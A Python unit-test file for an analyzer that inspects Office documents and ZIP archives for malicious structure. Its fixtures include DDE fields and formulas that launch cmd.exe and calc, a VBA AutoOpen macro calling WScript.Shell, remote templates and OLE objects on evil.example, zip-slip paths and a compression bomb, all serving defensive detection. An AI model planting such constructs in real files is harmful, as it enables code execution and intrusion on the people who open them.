"""Structure checks for Office (OOXML) files and ZIP archives, plus the extension-vs-content check."""

import io
import os
import time
import unittest
import zipfile

import helpers  # noqa: F401
import file_structure as F

CT = (b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
      b'<Default Extension="xml" ContentType="application/xml"/></Types>')
CT_MACRO = CT.replace(b"</Types>", b'<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
OLE_MAGIC = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
PE = b"MZ" + b"\x90" * 62 + b"PE\x00\x00" + b"\x00" * 200


def rels(rel_type, target, mode="External"):
    return ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/%s" '
            'Target="%s" TargetMode="%s"/></Relationships>' % (rel_type, target, mode)).encode()


def make_zip(entries, compress=zipfile.ZIP_DEFLATED):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compress) as zf:
        for name, data in entries:
            zf.writestr(name, data)
    return buf.getvalue()


def docx(extra=(), ct=CT, body=b"<w:document><w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>"):
    return make_zip([("[Content_Types].xml", ct), ("word/document.xml", body)] + list(extra))


def xlsx(extra=()):
    return make_zip([("[Content_Types].xml", CT), ("xl/workbook.xml", b"<workbook><sheets><sheet name='a' sheetId='1'/></sheets></workbook>"),
                     ("xl/worksheets/sheet1.xml", b"<worksheet><sheetData/></worksheet>")] + list(extra))


def run(data, name):
    path = helpers.write_temp(data, suffix=os.path.splitext(name)[1] or ".bin")
    try:
        return F.analyze(path, name)
    finally:
        os.remove(path)


def ids(r, strong_only=False):
    return [f["id"] for f in r["findings"] if f["strong"] or not strong_only]


class DetectType(unittest.TestCase):
    def kind(self, data, suffix=".bin"):
        p = helpers.write_temp(data, suffix)
        try:
            return F.detect_type(p)
        finally:
            os.remove(p)

    def test_types_come_from_the_content_not_the_name(self):
        self.assertEqual(self.kind(helpers.PDF_PLAIN, ".png"), "pdf")
        self.assertEqual(self.kind(helpers.PNG_BYTES, ".pdf"), "png")
        self.assertEqual(self.kind(PE, ".pdf"), "pe")
        self.assertEqual(self.kind(OLE_MAGIC + b"\0" * 50), "ole")
        self.assertEqual(self.kind(b"{\\rtf1\\ansi hi}"), "rtf")
        self.assertEqual(self.kind(b"\xff\xd8\xff\xe0" + b"\0" * 20), "jpg")
        self.assertEqual(self.kind(b"just some text\n"), "text")
        self.assertEqual(self.kind(docx()), "ooxml")
        self.assertEqual(self.kind(make_zip([("a.txt", b"hi")])), "zip")


class CleanFiles(unittest.TestCase):
    def test_a_plain_docx_has_no_findings(self):
        r = run(docx(), "report.docx")
        self.assertEqual(r["findings"], [])
        self.assertEqual(r["file_type"], "ooxml")

    def test_a_plain_xlsx_has_no_findings(self):
        self.assertEqual(run(xlsx(), "sheet.xlsx")["findings"], [])

    def test_a_plain_zip_of_documents_has_no_findings(self):
        z = make_zip([("notes.txt", b"hello" * 100), ("docs/a.pdf", helpers.PDF_PLAIN), ("img/p.png", helpers.PNG_BYTES)])
        r = run(z, "bundle.zip")
        self.assertEqual(r["findings"], [])
        self.assertEqual(r["file_type"], "zip")

    def test_a_docx_with_a_normal_hyperlink_and_image_is_clean(self):
        z = docx([("word/_rels/document.xml.rels", rels("hyperlink", "https://example.com/page")),
                  ("word/media/image1.png", helpers.PNG_BYTES)])
        self.assertEqual(run(z, "a.docx")["findings"], [])

    def test_real_project_docs_have_no_strong_findings(self):
        root = os.path.join(helpers.ROOT, "..", "docs")
        if not os.path.isdir(root):
            self.skipTest("project docs folder not present")
        files = [os.path.join(d, f) for d, _, fs in os.walk(root) for f in fs
                 if f.lower().endswith((".docx", ".xlsx", ".pptx", ".zip"))]
        if not files:
            self.skipTest("no Office/zip files under docs/")
        for p in files:
            r = F.analyze(p, os.path.basename(p))
            self.assertEqual(r["strong_ids"], [], os.path.basename(p))


class OfficeFindings(unittest.TestCase):
    def test_macro_project_in_a_docx_is_strong(self):
        r = run(docx([("word/vbaProject.bin", OLE_MAGIC + b"Attribute VB_Name = ThisDocument")], ct=CT_MACRO), "invoice.docx")
        self.assertIn("macro_in_macrofree_type", ids(r, True))

    def test_macro_content_type_alone_is_enough(self):
        self.assertIn("macro_in_macrofree_type", ids(run(docx(ct=CT_MACRO), "a.docx"), True))

    def test_autoexec_names_in_the_macro_are_strong_and_risky_calls_are_listed(self):
        blob = OLE_MAGIC + b"Sub AutoOpen()\nSet s = CreateObject(\"WScript.Shell\")\n"
        r = run(docx([("word/vbaProject.bin", blob)], ct=CT_MACRO), "a.docx")
        self.assertIn("macro_autoexec", ids(r, True))
        self.assertIn("macro_risky_calls", ids(r))

    def test_macro_enabled_extension_is_only_informational(self):
        # docm is not uploadable, but the analyzer must not call a legitimate docm "strong" for having a macro
        z = docx([("word/vbaProject.bin", OLE_MAGIC + b"x")], ct=CT_MACRO)
        p = helpers.write_temp(z, ".docm")
        try:
            r = F.analyze(p, "ok.docm")
        finally:
            os.remove(p)
        self.assertIn("office_macro", ids(r))
        self.assertNotIn("macro_in_macrofree_type", ids(r))

    def test_xlm_macro_sheet_is_strong(self):
        r = run(xlsx([("xl/macrosheets/sheet1.xml", b"<xm:macrosheet/>")]), "a.xlsx")
        self.assertIn("xlm_macro_sheet", ids(r, True))

    def test_very_hidden_sheet_is_not_strong(self):
        z = make_zip([("[Content_Types].xml", CT),
                      ("xl/workbook.xml", b'<workbook><sheets><sheet name="s" state="veryHidden"/></sheets></workbook>')])
        r = run(z, "a.xlsx")
        self.assertIn("very_hidden_sheet", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_dde_field_in_word_is_strong(self):
        body = (b'<w:document><w:body><w:p><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe '
                b'"/k calc.exe" </w:instrText></w:r></w:p></w:body></w:document>')
        self.assertIn("dde_field", ids(run(docx(body=body), "a.docx"), True))

    def test_the_word_dde_in_normal_text_is_not_a_field(self):
        body = b"<w:document><w:body><w:p><w:r><w:t>About DDE and DDEAUTO fields in history</w:t></w:r></w:p></w:body></w:document>"
        self.assertEqual(run(docx(body=body), "a.docx")["findings"], [])

    def test_dde_formula_in_excel_is_strong(self):
        z = make_zip([("[Content_Types].xml", CT), ("xl/workbook.xml", b"<workbook/>"),
                      ("xl/worksheets/sheet1.xml", b"<worksheet><sheetData><row><c><f>cmd|'/c calc'!A1</f></c></row></sheetData></worksheet>")])
        self.assertIn("dde_formula", ids(run(z, "a.xlsx"), True))

    def test_remote_template_is_strong(self):
        z = docx([("word/_rels/settings.xml.rels", rels("attachedTemplate", "http://evil.example/t.dotm"))])
        self.assertIn("remote_template", ids(run(z, "a.docx"), True))

    def test_remote_ole_object_is_strong(self):
        z = docx([("word/_rels/document.xml.rels", rels("oleObject", "https://evil.example/x.hta"))])
        self.assertIn("remote_object", ids(run(z, "a.docx"), True))

    def test_internal_relationships_are_not_flagged(self):
        z = docx([("word/_rels/settings.xml.rels", rels("attachedTemplate", "Normal.dotm", "Internal"))])
        self.assertEqual(run(z, "a.docx")["findings"], [])

    def test_unc_path_is_medium_not_strong(self):
        z = docx([("word/_rels/document.xml.rels", rels("image", "\\\\10.0.0.5\\share\\a.png"))])
        r = run(z, "a.docx")
        self.assertIn("unc_reference", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_embedded_program_is_strong(self):
        z = docx([("word/embeddings/oleObject1.bin", PE)])
        self.assertIn("embedded_executable", ids(run(z, "a.docx"), True))

    def test_embedded_ole_object_alone_is_informational(self):
        r = run(docx([("word/embeddings/oleObject1.bin", OLE_MAGIC + b"\0" * 100)]), "a.docx")
        self.assertIn("embedded_objects", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_a_program_in_an_office_file_is_strong_even_with_a_harmless_name(self):
        r = run(docx([("word/media/image9.png", PE)]), "a.docx")
        self.assertIn("disguised_executable", r["strong_ids"])

    def test_activex_is_medium(self):
        r = run(docx([("word/activeX/activeX1.xml", b"<ax/>")]), "a.docx")
        self.assertIn("activex_controls", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_docx_that_is_really_a_spreadsheet_is_flagged_medium(self):
        r = run(xlsx(), "report.docx")
        self.assertIn("ooxml_type_mismatch", ids(r))
        self.assertEqual(r["strong_ids"], [])


class ArchiveFindings(unittest.TestCase):
    def test_zip_slip_is_strong(self):
        r = run(make_zip([("../../Windows/Start Menu/evil.txt", b"x"), ("ok.txt", b"y")]), "a.zip")
        self.assertIn("path_traversal", ids(r, True))

    def test_absolute_and_drive_paths_are_strong(self):
        for bad in ("/etc/cron.d/x", "C:/Users/Public/x.txt", "\\\\server\\share\\x"):
            self.assertIn("path_traversal", ids(run(make_zip([(bad, b"x")]), "a.zip"), True), bad)

    def test_double_extension_is_strong(self):
        r = run(make_zip([("invoice.pdf.exe", PE)]), "a.zip")
        self.assertIn("double_extension", ids(r, True))

    def test_right_to_left_override_is_strong(self):
        r = run(make_zip([("report\u202egpj.exe", PE)]), "a.zip")
        self.assertIn("rtlo_name", ids(r, True))

    def test_a_renamed_program_is_found_by_its_content(self):
        r = run(make_zip([("holiday.jpg", PE)]), "a.zip")
        self.assertIn("disguised_executable", ids(r, True))

    def test_an_honest_installer_is_only_a_medium_finding(self):
        r = run(make_zip([("setup.exe", PE), ("readme.txt", b"hello")]), "a.zip")
        self.assertIn("executable_in_archive", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_a_script_in_a_zip_is_listed(self):
        r = run(make_zip([("run.ps1", b"Write-Host hi")]), "a.zip")
        self.assertIn("executable_in_archive", ids(r))

    def test_password_protected_entries_are_medium(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("secret.txt", b"x" * 100)
        data = bytearray(buf.getvalue())
        # set the "encrypted" general-purpose bit in the local and central headers
        for sig in (b"PK\x03\x04", b"PK\x01\x02"):
            i = data.find(sig)
            off = 6 if sig == b"PK\x03\x04" else 8
            data[i + off] |= 0x1
        r = run(bytes(data), "a.zip")
        self.assertIn("encrypted_entries", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_duplicate_names_are_medium(self):
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            z = make_zip([("a.txt", b"one"), ("a.txt", b"two")])
        r = run(z, "a.zip")
        self.assertIn("duplicate_entries", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_a_compression_bomb_is_strong_and_fast(self):
        z = make_zip([("zeros.bin", b"\0" * (300 * 1024 * 1024))])        # about 300 KB on disk
        self.assertLess(len(z), 2 * 1024 * 1024)
        t = time.time()
        r = run(z, "a.zip")
        self.assertIn("zip_bomb", ids(r, True))
        self.assertLess(time.time() - t, 3.5)                              # never expanded

    def test_a_large_but_honest_archive_is_not_a_bomb(self):
        import random
        rnd = random.Random(1)
        z = make_zip([("data.bin", bytes(rnd.getrandbits(8) for _ in range(300000)))], compress=zipfile.ZIP_STORED)
        self.assertNotIn("zip_bomb", ids(run(z, "a.zip")))

    def test_nested_archive_is_low(self):
        r = run(make_zip([("inner.zip", make_zip([("a.txt", b"x")]))]), "a.zip")
        self.assertIn("nested_archive", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_a_truncated_zip_is_reported_not_crashed(self):
        r = run(make_zip([("a.txt", b"hello world" * 50)])[:60], "a.zip")
        self.assertIn("malformed_archive", ids(r))
        self.assertIsNone(r["error"])

    def test_many_entries_stay_within_the_time_budget(self):
        z = make_zip([("f%d.txt" % i, b"x") for i in range(4000)])
        t = time.time()
        r = run(z, "a.zip")
        self.assertLess(time.time() - t, 4)
        self.assertEqual(r["strong_ids"], [])


class ExtensionVsContent(unittest.TestCase):
    def test_a_program_named_like_a_document_is_strong(self):
        for name in ("cv.pdf", "photo.png", "notes.docx", "data.zip"):
            r = run(PE, name)
            self.assertIn("type_mismatch_executable", ids(r, True), name)
            self.assertEqual(r["file_type"], "pe")

    def test_a_png_named_pdf_is_medium(self):
        r = run(helpers.PNG_BYTES, "report.pdf")
        self.assertIn("type_mismatch", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_a_pdf_named_png_is_medium_and_still_gets_the_pdf_checks(self):
        r = run(helpers.PDF_JS, "scan.png")
        self.assertIn("type_mismatch", ids(r))
        self.assertEqual(r["file_type"], "pdf")

    def test_a_plain_zip_named_docx_is_flagged(self):
        r = run(make_zip([("a.txt", b"x")]), "report.docx")
        self.assertIn("type_mismatch", ids(r))

    def test_matching_types_have_no_finding(self):
        self.assertEqual(run(helpers.PNG_BYTES, "a.png")["findings"], [])
        self.assertEqual(run(b"hello,world\n1,2\n", "a.csv")["findings"], [])
        self.assertEqual(run(docx(), "a.zip")["findings"], [])          # an Office file in a .zip is fine

    def test_a_program_that_is_also_a_zip_is_a_polyglot(self):
        z = PE + make_zip([("a.txt", b"x")])
        r = run(z, "a.zip")
        self.assertIn("polyglot_executable_archive", ids(r, True))


class Robustness(unittest.TestCase):
    def test_empty_and_garbage_files_never_raise(self):
        for data in (b"", b"\x00" * 10, os.urandom(4096), b"PK\x03\x04" + os.urandom(200), OLE_MAGIC):
            r = run(data, "x.zip")
            self.assertIn("findings", r)
            self.assertIn("file_type", r)

    def test_missing_path_never_raises(self):
        r = F.analyze(os.path.join(helpers.ROOT, "no-such-file.bin"), "a.zip")
        self.assertEqual(r["findings"], [])

    def test_result_shape_matches_the_pdf_layer(self):
        r = run(docx(), "a.docx")
        for key in ("findings", "strong_ids", "error", "scanned", "file_type", "file_type_label"):
            self.assertIn(key, r)
        for key in ("streams", "inflated_bytes", "truncated", "ms"):
            self.assertIn(key, r["scanned"])

    def test_a_pdf_still_uses_the_evasion_layer_unchanged(self):
        r = run(b"%PDF-1.3\n1 0 obj\n<< /Open#41ction 4 0 R >>\nendobj\n%%EOF\n", "a.pdf")
        self.assertIn("obfuscated_keywords", r["strong_ids"])
        self.assertEqual(r["file_type"], "pdf")


if __name__ == "__main__":
    unittest.main()
